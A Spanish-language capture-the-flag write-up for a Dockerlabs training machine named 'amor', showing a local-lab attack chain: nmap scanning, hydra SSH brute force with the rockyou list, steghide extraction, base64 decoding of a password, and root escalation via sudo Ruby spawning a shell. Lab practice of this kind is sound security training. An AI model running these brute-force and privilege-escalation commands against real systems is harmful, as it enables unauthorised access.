# amor

* Máquina **atacante** -> 172.17.0.1
* Máquina **objetivo** -> 172.17.0.2 | Linux :penguin:

### Escaneo de puertos

Realizamos un escaneo de puertos con *nmap* para ver puertos abiertos de la máquina **objetivo**:
```shell
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.17.0.2
```
![escaneo](/Capturas/2024-10-31_19-40.png)

Encontramos abiertos el puerto **80** y el puerto **22**.

### HTTP

Nos vamos al navegador y vemos qué tenemos corriendo por el puerto **80**. Nos encontramos con una especie de registrador de eventos titulado **SecurSEC S.L** (intuyo que es como se llama la empresa):

![securesl](/Capturas/2024-10-31_19-44.png)

Encontramos dos nombres, los cuales pueden ser potenciales usuarios de la máquina **objetivo**.

### Fuerza bruta

Al realizar fuerza bruta con ambos usuarios en *hydra*, encontramos que el usuario **carlota** tiene la contraseña **babygirl**:
```shell
hydra -l carlota  -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![hydra](/Capturas/2024-10-31_19-47.png)

### Intrusión

Accedemos vía **ssh** con las credenciales obtenidas mediante **fuerza bruta**:
```shell
ssh carlota@172.17.0.2
```
![ssh](/Capturas/2024-10-31_19-48.png)

Investigamos la máquina hasta encontrar **imagen.jpg** en el directorio `/home/carlota/Desktop/fotos/vacaciones`:

![imagen](/Capturas/2024-10-31_19-54.png)

Para poder inspeccionar bien la imagen, nos la pasamos a nuestra máquina **atacante**, en mi caso caso abriendo un servidor http por el puerto **444** y descargándola desde mi máquina **atacante**:
```shell
python3 -m http.server 444
```
![imagen_abierta](/Capturas/2024-10-31_19-59.png)

Una vez la tenemos, buscamos algún mensaje oculto con *steghide* y extraemos un **archivo.txt** que contiene información:
```shell
steghide extract -sf imagen.jpg
```
![estegnografia](/Capturas/2024-10-31_20-03.png)

Tras investigar sobre el contenido del **secret.txt**, damos con que el contenido está **codificado en base 64**, por lo que procedemos a su decodificación con el siguiente comando:
```shell
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
```
![decod](/Capturas/2024-10-31_20-06.png)

Vemos que nos saca el mensaje **eslacasadepinypon**. Por lo que debemos probar ese mensaje como contraseña con algún otro usuario. Si nos vamos a `/home` vemos que hay otro usuario llamado **Oscar**:

![oscar](/Capturas/2024-10-31_20-11.png)

Así que probamos ingresar a la máquina con el usuario **oscar** y la contraseña **eslacasadepinypon** y ¡bingo! Estamos dentro. Al buscar por su escritorio vemos que hay un archivo de texto llamado **IMPORTANTE.txt**:

![importante](/Capturas/2024-10-31_20-16.png)

> Hola ROOT, acuérdate de mirar el documento de tu escritorio.

### Escalada de privilegios

Probamos a ejecutar `sudo -l` para ver si podemos ejecutar algo como **root**:

![sudo-l](/Capturas/2024-10-31_20-19.png)

Parece que podemos ejecutar *Ruby* como **root**. Así que ejecutamos el siguiente comando y somos **root**:triangular_flag_on_post::
```shell
sudo ruby -e 'exec "/bin/sh"'
```
![root](/Capturas/2024-10-31_20-21.png)

Haciendo caso al mensaje del archivo **IMPORTANTE.txt**, si vamos al escritorio de **root**, nos encontramos con un archivo de texto **THX.txt** del creador de la máquina dando gracias:

![gracias](/Capturas/2024-10-31_20-23.png)

> Gracias a toda la comunidad de Dockerlabs y a Mario por toda la ayuda proporcionada para poder hacer la máquina.